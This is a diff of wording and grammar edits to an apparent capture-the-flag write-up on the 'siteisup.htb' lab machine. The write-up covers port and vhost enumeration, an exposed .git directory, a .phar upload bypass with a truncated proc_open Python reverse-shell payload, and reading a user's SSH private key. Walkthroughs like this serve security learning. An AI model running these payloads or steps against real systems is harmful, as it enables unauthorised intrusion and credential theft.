@@ -16,7 +16,7 @@ draft: false
 
 # Enumeration
 
-First I started with a full port scan using `Nmap`. 
+I started with a full TCP port scan using `Nmap`. 
 ```bash
 nmap -p- -sV -sC -oA nmap/tcp --min-rate=1000 -v 10.10.11.177
 Nmap scan report for 10.10.11.177
@@ -37,12 +37,13 @@ Only two ports open, so let's check what this webserver is running.
 ![Homepage](./homepage.png)
 > _Figure 1_: **Homepage of the site.**
 
-Seems to be a site that the main functionality is been vulnerable to *SSRF*. As I don't have much ideas to what to do with a SSRF I move forward with the enumeration. Note that in the buttom of the homepage I site shows the virtual host `siteisup.htb` but opening it give me the same page, so I started a vhost bruteforce with `ffuf`.
+The site appears to have a functionality that's vulnerable to SSRF. As I wasn’t sure how to exploit that immediately, I continued with enumeration.
+At the bottom of the page, the virtual host `siteisup.htb` is mentioned. Accessing it showed the same homepage, so I ran a vhost brute-force with `ffuf`:
 ```bash
 ffuf -w $subt5 -u http://10.10.11.177/ -H 'Host: FUZZ.siteisup.htb' -fs 1131
 ```
 
-And After some seconds running I found the vhost `dev.siteisup.htb` but when trying to open it return a 'Access Denied' error. My first thought as using the _SSRF_ of the first page to read the contents of `dev.siteisup.htb`, but it continues to return 'Access Denied' even if is the Webserver IP making the request. So, I take a step back and start a diretory bruteforce on both vhosts using the `feroxbuster` tool.
+And after some seconds running I found the vhost `dev.siteisup.htb` but when trying to open it return a 'Access Denied' error. My first thought as to use the _SSRF_ of the first page to read the contents of `dev.siteisup.htb`, but it continues to return 'Access Denied' even if is the Webserver IP making the request. So, I took a step back and started a diretory bruteforce on both vhosts using the `feroxbuster` tool.
 ```bash
 feroxbuster -w $smallw -u http://siteisup.htb
 feroxbuster -w $smallw -u http://dev.siteisup.htb
@@ -51,7 +52,7 @@ feroxbuster -w $smallw -u http://dev.siteisup.htb
 
 # Foothold
 
-The diretory bruteforcing returns some more results but the more intesting one is the directory `http://siteisup.htb/dev/.git`. I found have a **public .git** exposed on the website!, let's use the tool `git-dumper` to download the folder to my machine.
+The diretory bruteforcing returns some more results but the more intesting one is the directory `http://siteisup.htb/dev/.git`. I found that a **.git** directory was exposed on the website!, let's use the tool `git-dumper` to download the folder to my machine.
 
 ::github{repo='arthaud/git-dumper'}
 
@@ -80,7 +81,7 @@ Reading the content of the file `.htaccess` I discovery that the webserver on `d
 ![Request with Header](./special_header_curl.png)
 > _Figure 3_: **Webserver accepting the request with the Custom Header.**
 
-I made the follow _Match & Replace_ rule in Caido proxy, and open the site on my browser.
+I created the following _Match & Replace_ rule in Caido proxy, and open the site on my browser.
 
 ![Rule](./match_replace_caido.png)
 > _Figure 4_: **Rule to added the Header in all request to the vhost.**
@@ -153,7 +154,7 @@ Our file seams to be stored inside the `uploads/` folder followed by a subfolder
 
 Now seams all good to send the __PentestMonkey PHP Webshell__ named as 'rev.phar' and get a reverse connection, but when I send the file and opening the new directory created there **isn't** a file inside it :(. 
 
-So, I start analylise the code again to see what happen to the file we just uploaded, and found the follow snnipet of code on file `checker.php`:
+So, I start analyze the code again to see what happen to the file we just uploaded, and found the follow snnipet of code on file `checker.php`:
 
 ```php
 35 function isitup($url){                                           
@@ -215,7 +216,7 @@ https://google.com
 ![Disable functions](./disable_funtions.png)
 > _Figure 7_: **List of all disable functions.**
 
-Reading all functions that are disable, the most intesting one that ins't on the list is `proc_open` that let execute remote code on the victim machine. I made the follow payload to finally get a reverse shell:
+Reading all the functions that are disable, the most intesting one that ins't on the list is `proc_open` that let execute remote code on the victim machine. I made the follow payload to finally get a reverse shell:
 
 > revshell.phar
 ```php
@@ -238,7 +239,7 @@ $process = proc_open("python -c 'import socket,subprocess,os;s=socket.socket(soc
 ?> 
 ```
 ![Revshell](./revshell.png)
-> _Figure 8_: **Receivering a reverse connection as user 'www-data'.**
+> _Figure 8_: **Receiving a reverse connection as user 'www-data'.**
 
 # User Flag
 
@@ -259,7 +260,7 @@ And doing some research I found out that is possible to execute the following co
 ![developer access](./python_input_vuln.png)
 > _Figure 9_: **Executing code as user 'developer'.**
 
-But when I tried to read the _user.txt_ file it returns a **"Permissmion denied"** error, whatever I was able to read the contents of the __'.ssh/id_rsa'__ file as demostrated on __Figure 10__ , connect to the SSH as developer and finally read the contents of the _user.txt_ flag.
+But when I tried to read the _user.txt_ file it returns a **"Permission denied"** error, whatever I was able to read the contents of the __'.ssh/id_rsa'__ file as demostrated on __Figure 10__ , connect to the SSH as developer and finally read the contents of the _user.txt_ flag.
 
 ![id_rsa](./permission_denied_user.png)
 > _Figure 10_: **Reading the id_rsa file.**
